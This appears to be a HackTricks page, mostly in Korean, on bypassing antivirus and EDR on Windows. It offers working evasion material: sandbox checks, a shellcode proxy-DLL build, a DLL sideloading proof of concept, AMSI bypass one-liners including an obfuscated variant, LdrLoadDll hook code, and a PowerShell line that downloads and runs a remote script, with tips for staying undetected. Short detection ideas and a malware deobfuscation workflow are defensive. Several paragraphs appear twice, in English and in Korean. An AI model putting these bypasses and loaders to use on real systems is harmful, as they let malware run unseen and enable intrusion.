# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**이 페이지는** [**@m2rc_p**](https://twitter.com/m2rc_p)**가 작성했습니다!**

## Stop Defender

- [defendnot](https://github.com/es3n1n/defendnot): Windows Defender의 작동을 중지시키는 도구입니다.
- [no-defender](https://github.com/es3n1n/no-defender): 다른 AV를 가장하여 Windows Defender의 작동을 중지시키는 도구입니다.
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

## **AV Evasion Methodology**

현재 AV는 정적 탐지, 동적 분석, 그리고 더 고급 EDR의 경우 행동 분석 등 여러 방법으로 파일이 악성인지 확인합니다.

### **Static detection**

정적 탐지는 바이너리나 스크립트에서 알려진 악성 문자열 또는 바이트 배열을 플래그하거나 파일 자체에서 정보를 추출(예: file description, company name, digital signatures, icon, checksum 등)하여 이루어집니다. 이는 공개된 도구를 사용하면 더 쉽게 탐지될 수 있다는 의미입니다. 이런 탐지를 피하는 방법은 몇 가지가 있습니다:

- **암호화 (Encryption)**

바이너리를 암호화하면 AV가 프로그램을 탐지할 수 있는 방법이 없어지지만, 메모리에서 프로그램을 복호화하고 실행할 로더가 필요합니다.

- **난독화 (Obfuscation)**

때로는 바이너리나 스크립트의 일부 문자열만 변경하면 AV를 우회할 수 있지만, 무엇을 난독화하느냐에 따라 시간이 많이 걸릴 수 있습니다.

- **Custom tooling**

자체 도구를 개발하면 알려진 악성 시그니처가 없기 때문에 탐지 가능성이 낮아지지만, 이는 많은 시간과 노력이 필요합니다.

> [!TIP]
> Windows Defender의 정적 탐지에 대해 확인하는 좋은 방법은 [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck)입니다. 이 도구는 파일을 여러 세그먼트로 분할한 다음 Defender에게 각 세그먼트를 개별적으로 스캔하게 하여 바이너리에서 어떤 문자열이나 바이트가 플래그되는지 정확히 알려줍니다.

실무적인 AV 회피에 관한 이 [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf)를 꼭 확인해 보세요.

### **Dynamic analysis**

동적 분석은 AV가 바이너리를 샌드박스에서 실행하고 악성 활동(예: 브라우저 비밀번호를 복호화하여 읽으려 시도하거나 LSASS에 대해 minidump를 수행하는 등)을 관찰하는 방식입니다. 이 부분은 좀 더 까다로울 수 있지만, 샌드박스를 회피하기 위해 할 수 있는 몇 가지 방법은 다음과 같습니다.

- **Sleep before execution** 실행 전에 sleep을 넣는 것은 구현 방식에 따라 AV의 동적 분석을 우회하는 좋은 방법이 될 수 있습니다. AV는 사용자의 작업 흐름을 방해하지 않기 위해 파일을 스캔할 시간이 매우 짧으므로 긴 sleep을 사용하면 바이너리 분석을 방해할 수 있습니다. 문제는 많은 AV 샌드박스가 구현 방식에 따라 sleep을 건너뛸 수 있다는 것입니다.
- **Checking machine's resources** 보통 샌드박스는 사용할 수 있는 리소스가 매우 적습니다(예: < 2GB RAM). 그렇지 않으면 사용자의 머신을 느리게 할 수 있기 때문입니다. 여기서는 CPU 온도나 팬 속도 등을 확인하는 등 창의적으로 접근할 수 있습니다. 모든 것이 샌드박스에 구현되어 있지는 않습니다.
- **Machine-specific checks** 표적 사용자의 워크스테이션이 "contoso.local" 도메인에 가입되어 있다면, 컴퓨터의 도메인을 확인하여 지정한 도메인과 일치하는지 검사할 수 있습니다. 일치하지 않으면 프로그램을 종료하게 할 수 있습니다.

실제로 Microsoft Defender의 Sandbox 컴퓨터 이름은 HAL9TH이므로, 실행 전에 컴퓨터 이름을 확인하여 HAL9TH이면 Defender의 샌드박스 내에 있는 것이므로 프로그램을 종료하게 할 수 있습니다.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>출처: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

샌드박스 대처에 관한 [@mgeeky](https://twitter.com/mariuszbit)의 다른 유용한 팁들

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

앞서 말했듯이, **공개 도구**는 결국 **탐지**됩니다. 스스로에게 물어보세요:

예를 들어, LSASS를 덤프하려면 **정말로 mimikatz를 사용해야 하나요**? 아니면 덜 알려진 다른 프로젝트를 사용해 LSASS를 덤프할 수 있지 않을까요.

정답은 아마 후자일 것입니다. 예로 mimikatz는 AV와 EDR에 의해 가장 많이 플래그되는 도구 중 하나일 가능성이 높습니다. 프로젝트 자체는 훌륭하지만 AV를 우회하기에는 다루기 어려운 경우가 많으므로, 달성하려는 목적에 대한 대체 도구를 찾아보세요.

> [!TIP]
> payload를 회피용으로 수정할 때는 Defender의 자동 샘플 제출(automatic sample submission)을 반드시 끄고, 장기적인 회피 달성이 목표라면 절대, 진지하게 **VIRUSTOTAL에 업로드하지 마세요**. 특정 AV에서 payload가 탐지되는지 확인하고 싶다면 VM에 AV를 설치하고 자동 샘플 제출을 끈 뒤 거기서 테스트해 만족할 때까지 확인하세요.

## EXEs vs DLLs

가능하다면 항상 회피를 위해 **DLL을 우선적으로 사용**하세요. 제 경험상 DLL 파일은 보통 **탐지되는 비율이 훨씬 낮고** 분석 대상이 되는 경우도 적습니다. 따라서 payload가 DLL로 실행될 수 있는 방법이 있다면 간단한 요령으로 탐지를 피할 수 있습니다.

아래 이미지에서 볼 수 있듯이, Havoc의 DLL Payload는 antiscan.me에서 탐지율이 4/26인 반면 EXE payload는 7/26의 탐지율을 보였습니다.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me에서 일반 Havoc EXE payload와 일반 Havoc DLL 비교</p></figcaption></figure>

이제 DLL 파일로 훨씬 더 은밀해질 수 있는 몇 가지 요령을 보여드리겠습니다.

## DLL Sideloading & Proxying

**DLL Sideloading**은 victim application과 악성 payload를 같은 디렉터리에 위치시키는 방식으로 로더의 DLL 검색 순서를 악용합니다.

[Siofra](https://github.com/Cybereason/siofra)와 다음 powershell 스크립트를 사용하여 DLL Sideloading에 취약한 프로그램을 확인할 수 있습니다:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
이 명령은 "C:\Program Files\\" 내부에서 DLL hijacking에 취약한 프로그램 목록과 해당 프로그램들이 로드하려고 시도하는 DLL 파일들을 출력합니다.

저는 **직접 DLL Hijackable/Sideloadable 프로그램을 탐색해 보실 것**을 강력히 권합니다. 이 기법은 제대로 하면 꽤 은밀하지만, 공개적으로 알려진 DLL Sideloadable 프로그램을 사용하면 쉽게 잡힐 수 있습니다.

프로그램이 로드할 것으로 예상하는 이름의 악성 DLL을 단순히 배치하는 것만으로는 페이로드가 실행되지 않습니다. 프로그램은 해당 DLL 안에 특정 함수들을 기대하기 때문입니다. 이 문제를 해결하기 위해 우리는 **DLL Proxying/Forwarding**이라는 또 다른 기법을 사용할 것입니다.

**DLL Proxying**은 프록시(그리고 악성) DLL에서 원래 DLL로 프로그램이 호출한 함수를 전달하여 프로그램의 기능을 유지하면서 페이로드 실행을 처리할 수 있게 합니다.

저는 [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) 프로젝트를 [@flangvik](https://twitter.com/Flangvik/)의 것을 사용할 것입니다.

These are the steps I followed:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
마지막 명령은 2개의 파일을 생성합니다: DLL 소스 코드 템플릿과 원본 이름이 변경된 DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
결과는 다음과 같습니다:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

우리의 shellcode ([SGN](https://github.com/EgeBalci/sgn)으로 인코딩된)와 proxy DLL은 [antiscan.me](https://antiscan.me)에서 0/26 탐지율을 보였습니다! 저는 이를 성공이라고 부르겠습니다.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> 앞에서 논의한 내용을 더 깊이 이해하려면 DLL Sideloading에 관한 [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543)와 [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE)를 꼭 보시길 강력히 권합니다.

### Forwarded Exports 악용 (ForwardSideLoading)

Windows PE 모듈은 사실상 "forwarders"인 함수를 export할 수 있습니다: 코드 대신, export 엔트리는 `TargetDll.TargetFunc` 형식의 ASCII 문자열을 포함합니다. 호출자가 export를 해석하면, Windows loader는:

- `TargetDll`가 아직 로드되어 있지 않다면 로드합니다
- 그 모듈에서 `TargetFunc`를 해결합니다

이해해야 할 핵심 동작:
- `TargetDll`가 KnownDLL이면, 보호된 KnownDLLs 네임스페이스(예: ntdll, kernelbase, ole32)에서 제공됩니다.
- `TargetDll`가 KnownDLL이 아닐 경우, 일반 DLL 검색 순서가 사용되며, 여기에는 forward 해석을 수행하는 모듈의 디렉터리가 포함됩니다.

이로 인해 간접적인 sideloading primitive가 가능해집니다: 함수가 non-KnownDLL 모듈 이름으로 forward된 함수를 export하는 서명된 DLL을 찾아, 그 서명된 DLL과 동일한 디렉터리에 forward 대상 모듈과 정확히 같은 이름의 attacker-controlled DLL을 함께 배치합니다. forwarded export가 호출되면, 로더는 forward를 해결하고 동일한 디렉터리에서 당신의 DLL을 로드하여 DllMain을 실행합니다.

Windows 11에서 관찰된 예:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll`은 KnownDLL이 아니므로 일반적인 검색 순서에 따라 해결됩니다.

PoC (복사-붙여넣기):
1) 서명된 시스템 DLL을 쓰기 가능한 폴더로 복사합니다.
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) 악성 `NCRYPTPROV.dll`을 같은 폴더에 배치합니다. 최소한의 DllMain만으로 코드 실행이 가능하며, DllMain을 트리거하기 위해 포워드된 함수를 구현할 필요는 없습니다.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) 서명된 LOLBin으로 전달을 트리거:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Observed behavior:
- rundll32 (signed)이 side-by-side인 `keyiso.dll` (signed)을 로드합니다
- `KeyIsoSetAuditingInterface`를 해결하는 동안 로더는 포워드가 가리키는 `NCRYPTPROV.SetAuditingInterface`로 이동합니다
- 그 후 로더는 `C:\test`에서 `NCRYPTPROV.dll`을 로드하고 그 `DllMain`을 실행합니다
- 만약 `SetAuditingInterface`가 구현되어 있지 않다면, `DllMain`이 이미 실행된 후에야 "missing API" 오류를 받게 됩니다

Hunting tips:
- 타겟 모듈이 KnownDLL이 아닌 forwarded exports에 집중하세요. KnownDLLs는 `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`에 나열되어 있습니다.
- forwarded exports를 열거하려면 다음과 같은 도구를 사용할 수 있습니다:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- 후보를 찾기 위해 Windows 11 forwarder 인벤토리를 확인하세요: https://hexacorn.com/d/apis_fwd.txt

탐지/방어 아이디어:
- LOLBins (예: rundll32.exe)이 비시스템 경로에서 서명된 DLL을 로드한 뒤, 해당 디렉터리에서 동일한 기본 이름을 가진 non-KnownDLLs를 로드하는 동작을 모니터링하세요
- 사용자 쓰기 가능한 경로에서 `rundll32.exe` → non-system `keyiso.dll` → `NCRYPTPROV.dll` 같은 프로세스/모듈 체인에 대해 경고를 발생시키세요
- 코드 무결성 정책(WDAC/AppLocker)을 적용하고 애플리케이션 디렉터리에 대한 write+execute를 차단하세요

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Freeze를 사용하여 shellcode를 은밀하게 로드하고 실행할 수 있습니다.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> 회피(evasion)는 단순한 고양이와 생쥐의 게임입니다. 오늘 통하는 방법이 내일에는 탐지될 수 있으므로 하나의 도구에만 의존하지 말고, 가능하면 여러 회피 기법을 연쇄적으로 사용해 보세요.

## AMSI (Anti-Malware Scan Interface)

AMSI는 "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)"를 방지하기 위해 만들어졌습니다. 초기에는 AV가 디스크의 파일만(**files on disk**) 스캔할 수 있었기 때문에, 페이로드를 **메모리에서 직접(directly in-memory)** 실행할 수 있다면 AV는 충분한 가시성이 없어 이를 막을 수 없었습니다.

AMSI 기능은 Windows의 다음 구성 요소에 통합되어 있습니다.

- User Account Control, or UAC (EXE, COM, MSI 또는 ActiveX 설치의 권한 상승)
- PowerShell (스크립트, 대화형 사용 및 동적 코드 평가)
- Windows Script Host (wscript.exe 및 cscript.exe)
- JavaScript 및 VBScript
- Office VBA 매크로

AMSI는 스크립트 내용을 암호화되거나 난독화되지 않은 형태로 노출시켜 안티바이러스 솔루션이 스크립트 동작을 검사할 수 있도록 합니다.

`IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')`를 실행하면 Windows Defender에서 다음과 같은 경고가 발생합니다.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

`amsi:`를 접두사로 붙이고 스크립트가 실행된 실행 파일의 경로(이 경우 powershell.exe)를 표시하는 것을 확인할 수 있습니다.

우리는 디스크에 파일을 떨어뜨리지 않았지만 AMSI 때문에 메모리 내에서 탐지되었습니다.

또한 **.NET 4.8**부터는 C# 코드도 AMSI를 통과합니다. 이는 `Assembly.Load(byte[])`를 통한 메모리 로드(메모리 내 실행)에도 영향을 줍니다. 따라서 AMSI를 회피하려면 메모리 내 실행 시 .NET 하위 버전(예: 4.7.2 이하)을 사용하는 것이 권장됩니다.

AMSI를 우회하는 방법은 몇 가지가 있습니다:

- **Obfuscation**

AMSI는 주로 정적 탐지에 의존하기 때문에 로드하려는 스크립트를 수정하는 것이 탐지를 회피하는 좋은 방법이 될 수 있습니다.

그러나 AMSI는 여러 계층의 난독화된 스크립트도 원래 형태로 복원(unobfuscating)할 수 있는 능력을 가지고 있어, 난독화는 어떻게 했느냐에 따라 오히려 좋지 않은 선택이 될 수 있습니다. 때문에 회피가 그렇게 단순하지 않을 수 있습니다. 다만 때로는 변수 이름 몇 개만 바꾸는 것으로 충분할 때도 있으므로, 얼마나 심하게 플래그가 지정되었는지에 따라 달라집니다.

- **AMSI Bypass**

AMSI가 powershell(또는 cscript.exe, wscript.exe 등) 프로세스에 DLL을 로드하는 방식으로 구현되어 있기 때문에, 권한이 없는 사용자로 실행 중이더라도 이를 조작하는 것이 비교적 쉬운 경우가 있습니다. AMSI 구현의 이 결함으로 인해 연구자들은 AMSI 스캐닝을 회피하는 다양한 방법을 찾아냈습니다.

**Forcing an Error**

AMSI 초기화를 실패하게(amsiInitFailed) 강제하면 해당 프로세스에 대해 스캔이 시작되지 않습니다. 이 방법은 원래 [Matt Graeber](https://twitter.com/mattifestation)에 의해 공개되었고, Microsoft는 보다 광범위한 사용을 막기 위해 시그니처를 만들었습니다.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
현재 powershell 프로세스에서 AMSI를 사용할 수 없게 만드는 데 필요한 것은 powershell 코드 한 줄뿐이었다. 물론 이 한 줄은 AMSI 자체에 의해 탐지되었기 때문에 이 기법을 사용하려면 약간의 수정이 필요하다.

다음은 내가 이 [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db)에서 가져온 수정된 AMSI bypass이다.
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Keep in mind, that this will probably get flagged once this post comes out, so you should not publish any code if your plan is staying undetected.

**Memory Patching**

이 기술은 처음에 [@RastaMouse](https://twitter.com/_RastaMouse/)에 의해 발견되었으며, amsi.dll의 "AmsiScanBuffer" 함수 주소를 찾아 사용자 제공 입력을 스캔하는 해당 함수를 E_INVALIDARG 코드를 반환하도록 덮어쓰는 방식입니다. 이렇게 하면 실제 스캔의 결과가 0을 반환하게 되고, 이는 클린 결과로 해석됩니다.

> [!TIP]
> 자세한 설명은 [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/)을(를) 참조하세요.

There are also many other techniques used to bypass AMSI with powershell, check out [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) and [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) to learn more about them.

### amsi.dll 로드 방지로 AMSI 차단 (LdrLoadDll hook)

AMSI는 현재 프로세스에 `amsi.dll`이 로드된 후에만 초기화됩니다. 언어에 관계없는 강력한 우회 방법은 요청된 모듈이 `amsi.dll`일 때 오류를 반환하도록 `ntdll!LdrLoadDll`에 사용자 모드 훅을 거는 것입니다. 그 결과 AMSI는 로드되지 않으며 해당 프로세스에 대해 스캔이 발생하지 않습니다.

Implementation outline (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Notes
- Works across PowerShell, WScript/CScript and custom loaders alike (anything that would otherwise load AMSI).
- Pair with feeding scripts over stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) to avoid long command‑line artefacts.
- Seen used by loaders executed through LOLBins (e.g., `regsvr32` calling `DllRegisterServer`).

This tools [https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail) also generates script to bypass AMSI.

**탐지된 AMSI signature 제거**

You can use a tool such as **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** and **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** to remove the detected AMSI signature from the memory of the current process. This tool works by scanning the memory of the current process for the AMSI signature and then overwriting it with NOP instructions, effectively removing it from memory.

이 도구들(**[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** 및 **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)**)은 현재 프로세스의 메모리에서 탐지된 AMSI signature를 제거하는 데 사용할 수 있습니다. 이 도구들은 현재 프로세스의 메모리를 스캔해 AMSI signature를 찾아 NOP 명령으로 덮어써 메모리에서 사실상 제거합니다.

**AMSI를 사용하는 AV/EDR 제품**

You can find a list of AV/EDR products that uses AMSI in **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

AMSI를 사용하는 AV/EDR 제품 목록은 **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**에서 확인할 수 있습니다.

**Use Powershell version 2**
If you use PowerShell version 2, AMSI will not be loaded, so you can run your scripts without being scanned by AMSI. You can do this:
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell logging은 시스템에서 실행된 모든 PowerShell 명령을 기록할 수 있게 해주는 기능입니다. 이는 감사(auditing)나 문제해결에 유용하지만, 탐지를 회피하려는 공격자에게는 **문제가 될 수 있습니다**.

PowerShell logging을 우회하려면 다음 기술을 사용할 수 있습니다:

- **Disable PowerShell Transcription and Module Logging**: 이 목적을 위해 [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) 같은 도구를 사용할 수 있습니다.
- **Use Powershell version 2**: PowerShell version 2를 사용하면 AMSI가 로드되지 않으므로 AMSI에 의해 스캔되지 않고 스크립트를 실행할 수 있습니다. 다음과 같이 실행합니다: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: 방어 기능 없이 powershell을 생성하려면 [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell)를 사용하세요 (이것이 Cobal Strike의 `powerpick`이 사용하는 방식입니다).

## Obfuscation

> [!TIP]
> Several obfuscation techniques relies on encrypting data, which will increase the entropy of the binary which will make easier for AVs and EDRs to detect it. Be careful with this and maybe only apply encryption to specific sections of your code that is sensitive or needs to be hidden.

### Deobfuscating ConfuserEx-Protected .NET Binaries

ConfuserEx 2(또는 상용 포크)를 사용하는 malware를 분석할 때는 디컴파일러와 샌드박스를 차단하는 여러 보호 계층을 마주하는 것이 일반적입니다. 아래 워크플로우는 이후 dnSpy나 ILSpy 같은 도구로 C#으로 디컴파일할 수 있도록 신뢰성 있게 **near–original IL을 복원**합니다.

1.  Anti-tampering 제거 – ConfuserEx는 모든 *method body*를 암호화하고 *module* static constructor(` <Module>.cctor`) 내부에서 복호화합니다. 또한 PE checksum을 패치하므로 어떤 수정이라도 바이너리를 충돌시키게 됩니다. 암호화된 메타데이터 테이블을 찾고 XOR 키를 복구하여 깨끗한 어셈블리를 재작성하려면 **AntiTamperKiller**를 사용하세요:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
출력에는 자체 unpacker를 만들 때 유용하게 쓰일 수 있는 6개의 anti-tamper 파라미터(`key0-key3`, `nameHash`, `internKey`)가 포함됩니다.

2.  Symbol / control-flow 복구 – *clean* 파일을 **de4dot-cex**(ConfuserEx-aware de4dot 포크)에 공급하세요.
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – ConfuserEx 2 프로필 선택  
• de4dot는 control-flow flattening을 되돌리고, 원래의 namespaces, classes 및 변수명을 복원하며 상수 문자열을 복호화합니다.

3.  Proxy-call 제거 – ConfuserEx는 직접적인 메서드 호출을 가벼운 래퍼(a.k.a *proxy calls*)로 교체하여 디컴파일을 더 어렵게 만듭니다. 이를 제거하려면 **ProxyCall-Remover**를 사용하세요:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
이 단계 이후에는 불투명한 래퍼 함수들(`Class8.smethod_10`, …) 대신 `Convert.FromBase64String`이나 `AES.Create()` 같은 일반적인 .NET API를 볼 수 있어야 합니다.

4.  수동 정리 – 결과 바이너리를 dnSpy에서 실행하고 큰 Base64 블롭이나 `RijndaelManaged`/`TripleDESCryptoServiceProvider` 사용을 검색하여 *실제* 페이로드 위치를 찾으세요. 종종 malware는 이를 `<Module>.byte_0` 내부에 초기화된 TLV-encoded 바이트 배열로 저장합니다.

위 체인은 악성 샘플을 실행할 필요 없이 실행 흐름을 복원하므로 오프라인 워크스테이션에서 작업할 때 유용합니다.

> 🛈  ConfuserEx는 `ConfusedByAttribute`라는 커스텀 어트리뷰트를 생성하며, 이는 샘플을 자동으로 분류(triage)하는 IOC로 사용할 수 있습니다.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): 이 프로젝트의 목적은 [LLVM](http://www.llvm.org/) 컴파일러 스위트의 오픈 소스 포크를 제공하여 [code obfuscation] 및 변조 방지를 통해 소프트웨어 보안을 향상시키는 것입니다.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator는 `C++11/14` 언어를 사용하여 외부 도구나 컴파일러 수정을 사용하지 않고 컴파일 시점에 obfuscated code를 생성하는 방법을 보여줍니다.
- [**obfy**](https://github.com/fritzone/obfy): C++ template metaprogramming framework로 생성된 obfuscated operations 레이어를 추가하여 애플리케이션을 크랙하려는 사람의 작업을 조금 더 어렵게 만듭니다.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz는 .exe, .dll, .sys 등을 포함한 다양한 pe 파일을 obfuscate할 수 있는 x64 binary obfuscator입니다.
- [**metame**](https://github.com/a0rtega/metame): Metame는 임의 실행 파일을 위한 간단한 metamorphic code engine입니다.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator는 ROP (return-oriented programming)를 사용하여 LLVM 지원 언어용의 세밀한 code obfuscation framework입니다. ROPfuscator는 일반 명령어를 ROP 체인으로 변환하여 어셈블리 코드 수준에서 프로그램을 obfuscate함으로써 일반적인 제어 흐름에 대한 우리의 자연스러운 개념을 무력화합니다.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt는 Nim으로 작성된 .NET PE Crypter입니다.
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor는 기존 EXE/DLL을 shellcode로 변환한 다음 이를 로드할 수 있습니다

## SmartScreen & MoTW

You may have seen this screen when downloading some executables from the internet and executing them.

Microsoft Defender SmartScreen is a security mechanism intended to protect the end user against running potentially malicious applications.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen mainly works with a reputation-based approach, meaning that uncommonly download applications will trigger SmartScreen thus alerting and preventing the end user from executing the file (although the file can still be executed by clicking More Info -> Run anyway).

**MoTW** (Mark of The Web) is an [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) with the name of Zone.Identifier which is automatically created upon download files from the internet, along with the URL it was downloaded from.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>인터넷에서 다운로드한 파일의 Zone.Identifier ADS 확인.</p></figcaption></figure>

> [!TIP]
> 서명된 실행 파일이 **신뢰할 수 있는** 서명 인증서로 서명된 경우 **SmartScreen을 유발하지 않습니다**.

A very effective way to prevent your payloads from getting the Mark of The Web is by packaging them inside some sort of container like an ISO. This happens because Mark-of-the-Web (MOTW) **적용될 수 없습니다** to **non NTFS** volumes.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/)은 payloads를 출력 컨테이너로 패키징하여 Mark-of-the-Web을 회피하는 도구입니다.

Example usage:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
